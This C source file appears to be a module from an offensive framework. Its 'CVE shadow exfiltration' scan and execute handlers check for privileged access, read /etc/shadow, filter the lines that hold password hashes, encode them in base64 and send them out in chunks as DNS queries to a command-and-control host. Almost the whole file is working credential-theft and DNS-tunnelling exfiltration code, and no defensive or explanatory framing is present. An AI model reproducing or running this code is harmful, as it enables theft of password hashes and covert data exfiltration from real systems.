#define _POSIX_C_SOURCE 200809L
#include "cve_shadow_exfiltration.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <time.h>

// Configuration
#define DNS_PORT 53
#define BUF_SIZE 512
#define MAX_LABEL 50
#define C2_IP "c2"
#define C2_DOMAIN "c2"

// DNS header (RFC 1035)
struct dns_header {
    uint16_t id;
    uint16_t flags;
    uint16_t qdcount;
    uint16_t ancount;
    uint16_t nscount;
    uint16_t arcount;
};

/**
 * Encode hostname into DNS QNAME format
 */
static int encode_qname(unsigned char *buf, const char *host) {
    int pos = 0;
    const char *beg = host;
    const char *p = host;

    while (*p) {
        if (*p == '.') {
            buf[pos++] = p - beg;
            memcpy(&buf[pos], beg, p - beg);
            pos += p - beg;
            beg = p + 1;
        }
        p++;
    }

    buf[pos++] = p - beg;
    memcpy(&buf[pos], beg, p - beg);
    pos += p - beg;
    buf[pos++] = 0; // End of QNAME

    return pos;
}

/**
 * Base64 URL-safe encoding
 */
static void base64_encode_urlsafe(const unsigned char *input, int len, char *output) {
    const char *table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
    int i, j;
    
    for (i = 0, j = 0; i < len;) {
        uint32_t octet_a = i < len ? input[i++] : 0;
        uint32_t octet_b = i < len ? input[i++] : 0;
        uint32_t octet_c = i < len ? input[i++] : 0;
        
        uint32_t triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;
        
        output[j++] = table[(triple >> 3 * 6) & 0x3F];
        output[j++] = table[(triple >> 2 * 6) & 0x3F];
        output[j++] = table[(triple >> 1 * 6) & 0x3F];
        output[j++] = table[(triple >> 0 * 6) & 0x3F];
    }
    
    int mod = len % 3;
    if (mod == 1) {
        j -= 2; // Remove last 2 chars
    } else if (mod == 2) {
        j -= 1; // Remove last 1 char
    }
    
    output[j] = '\0';
}

/**
 * Send a DNS query
 */
static void send_dns_query(int sock, struct sockaddr_in *dest, const char *hostname) {
    unsigned char buf[BUF_SIZE];
    struct dns_header *dns;
    int qname_len;

    memset(buf, 0, BUF_SIZE);

    dns = (struct dns_header *) buf;
    dns->id = htons(rand() % 0xFFFF);
    dns->flags = htons(0x0100);
    dns->qdcount = htons(1);

    qname_len = encode_qname(buf + sizeof(struct dns_header), hostname);

    uint16_t *qtype = (uint16_t *)(buf + sizeof(struct dns_header) + qname_len);
    *qtype = htons(1); // A record

    uint16_t *qclass = qtype + 1;
    *qclass = htons(1); // IN class

    int packet_len = sizeof(struct dns_header) + qname_len + 4;

    sendto(sock, buf, packet_len, 0, (struct sockaddr *)dest, sizeof(*dest));
}

/**
 * Exfiltrate message via DNS tunneling
 */
static void exfiltrate(const char *message, const char *c2_ip, const char *domain) {
    printf("[*] Starting DNS exfiltration to %s...\n", c2_ip);
    int sock;
    struct sockaddr_in dest;
    char *encoded = malloc(strlen(message) * 2 + 1); 
    if (!encoded) return;
    
    char session[16];
    char hostname[256];
    int len = strlen(message);

    // Generate session ID
    unsigned long r;
    srand(time(NULL));
    r = rand();
    snprintf(session, sizeof(session), "%lx", r);

    // Encode message in base64 URL-safe
    base64_encode_urlsafe((const unsigned char*)message, len, encoded);

    // Resolve C2 IP
    struct addrinfo hints, *res;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_DGRAM;
    
    if (getaddrinfo(c2_ip, NULL, &hints, &res) != 0) {
        fprintf(stderr, "[!] Error resolving %s\n", c2_ip);
        free(encoded);
        return;
    }

    // Create UDP socket
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    dest.sin_family = AF_INET;
    dest.sin_port = htons(DNS_PORT);
    dest.sin_addr = ((struct sockaddr_in *)res->ai_addr)->sin_addr;
    
    freeaddrinfo(res);

    // Split into fragments
    int seq = 0;
    int total_len = strlen(encoded);
    int pos = 0;

    while (pos < total_len) {
        int chunk_size = (total_len - pos > MAX_LABEL) ? MAX_LABEL : (total_len - pos);
        char chunk[MAX_LABEL + 1];
        
        strncpy(chunk, encoded + pos, chunk_size);
        chunk[chunk_size] = '\0';

        snprintf(hostname, sizeof(hostname), "%s.%d.%s.%s", session, seq, chunk, domain);
        
        printf("[DNS] Sending fragment %d: %s\n", seq, hostname);
        send_dns_query(sock, &dest, hostname);
        
        usleep(100000); // 100ms delay
        pos += chunk_size;
        seq++;
    }

    // Send END marker
    snprintf(hostname, sizeof(hostname), "%s.END.X.%s", session, domain);
    printf("[DNS] Sending END: %s\n", hostname);
    send_dns_query(sock, &dest, hostname);

    close(sock);
    free(encoded);
    printf("[+] DNS exfiltration completed\n");
}

/**
 * Steal /etc/shadow file and exfiltrate via DNS
 */
static void steal_shadow(void) {
    printf("[*] Attempting to steal /etc/shadow...\n");
    FILE* f = fopen("/etc/shadow", "r");
    if (!f) {
        printf("[-] Failed to open /etc/shadow: %s\n", strerror(errno));
        return;
    }
    
    // Read entire file into memory (limit 10KB for safety)
    char *buffer = malloc(10240);
    if (!buffer) {
        fclose(f);
        return;
    }
    
    size_t bytes_read = fread(buffer, 1, 10240 - 1, f);
    buffer[bytes_read] = '\0';
    fclose(f);
    
    if (bytes_read > 0) {
        // Filter lines: skip if second field (after first ':') has length <= 1
        char *filtered = malloc(10240);
        if (!filtered) {
            free(buffer);
            return;
        }
        
        char *line = strtok(buffer, "\n");
        size_t filtered_len = 0;
        
        while (line != NULL) {
            char *first_colon = strchr(line, ':');
            if (first_colon) {
                char *second_colon = strchr(first_colon + 1, ':');
                size_t second_field_len;
                
                if (second_colon) {
                    second_field_len = second_colon - (first_colon + 1);
                } else {
                    second_field_len = strlen(first_colon + 1);
                }
                
                // Only include lines where second field length > 1
                if (second_field_len > 1) {
                    size_t line_len = strlen(line);
                    if (filtered_len + line_len + 1 < 10240) {
                        strcpy(filtered + filtered_len, line);
                        filtered_len += line_len;
                        filtered[filtered_len++] = '\n';
                    }
                }
            }
            
            line = strtok(NULL, "\n");
        }
        
        filtered[filtered_len] = '\0';
        
        if (filtered_len > 0) {
            printf("[*] Sending %zu bytes of filtered shadow file...\n", filtered_len);
            exfiltrate(filtered, C2_IP, C2_DOMAIN);
            printf("[+] Shadow file exfiltration completed\n");
        } else {
            printf("[-] No valid entries found in /etc/shadow.\n");
        }
        
        free(filtered);
    } else {
        printf("[-] /etc/shadow is empty or could not be read.\n");
    }
    
    free(buffer);
}

// State tracking: prevent duplicate exfiltration
static int shadow_exfiltration_completed = 0;

/**
 * CVE Shadow Exfiltration Scan Handler
 * Checks if we have privileges to read /etc/shadow (root/privileged access)
 * and if exfiltration has not already been completed
 * 
 * Scan logic:
 * 1. Check if exfiltration was already completed (if yes, return not vulnerable)
 * 2. Check if we can read /etc/shadow file (indicates root/privileged access)
 * 3. Return vulnerable=true if we have access and haven't exfiltrated yet, false otherwise
 * 
 * Note: target_ip parameter is ignored - handler checks local privileges
 */
cve_scan_result_t cve_shadow_exfiltration_scan(const char* target_ip) {
    (void)target_ip;  // Handler checks local privileges
    
    cve_scan_result_t result = {0};
    result.cve_id = CVE_SHADOW_EXFILTRATION;
    
    // If already completed, mark as not vulnerable to prevent re-execution
    if (shadow_exfiltration_completed) {
        result.is_vulnerable = 0;
        result.confidence = 0;
        result.port_open = 0;
        result.service_type[0] = '\0';
        printf("[*] Shadow exfiltration already completed - skipping\n");
        return result;
    }
    
    // Check if we can read /etc/shadow (requires root/privileged access)
    if (access("/etc/shadow", R_OK) == 0) {
        // We have read access to /etc/shadow = we're running with privileges
        result.is_vulnerable = 1;
        result.confidence = 10;  // High confidence - we can actually read the file
        result.port_open = 0;    // No port requirement
        strncpy(result.service_type, "LOCAL", sizeof(result.service_type) - 1);
        printf("[*] Privileged access detected - can read /etc/shadow\n");
    } else {
        // No read access = not privileged
        result.is_vulnerable = 0;
        result.confidence = 0;
        result.port_open = 0;
        result.service_type[0] = '\0';
        printf("[*] No privileged access - cannot read /etc/shadow\n");
    }
    
    return result;
}

/**
 * CVE Shadow Exfiltration Execution Handler
 * Steals /etc/shadow file and exfiltrates it via DNS tunneling
 * 
 * Execution flow:
 * 1. Check if already executed (prevent duplicate exfiltration)
 * 2. Read /etc/shadow file
 * 3. Filter out empty/disabled password entries
 * 4. Encode in base64 URL-safe
 * 5. Exfiltrate via DNS queries to C2 server
 * 6. Mark as completed to prevent future executions
 * 
 * Note: target_ip parameter is ignored - handler operates on local system
 */
int cve_shadow_exfiltration_execute(const char* target_ip) {
    (void)target_ip;  // Handler operates on local system
    
    // Prevent duplicate execution
    if (shadow_exfiltration_completed) {
        printf("[*] Shadow exfiltration already completed - skipping\n");
        return 0;
    }
    
    // Verify we still have access (may have changed since scan)
    if (access("/etc/shadow", R_OK) != 0) {
        printf("[-] Cannot read /etc/shadow: %s\n", strerror(errno));
        return 0;
    }
    
    // Steal and exfiltrate shadow file
    steal_shadow();
    
    // Mark as completed to prevent future executions
    shadow_exfiltration_completed = 1;
    printf("[+] Shadow exfiltration completed - marked as done (will not execute again)\n");
    
    return 1;
}

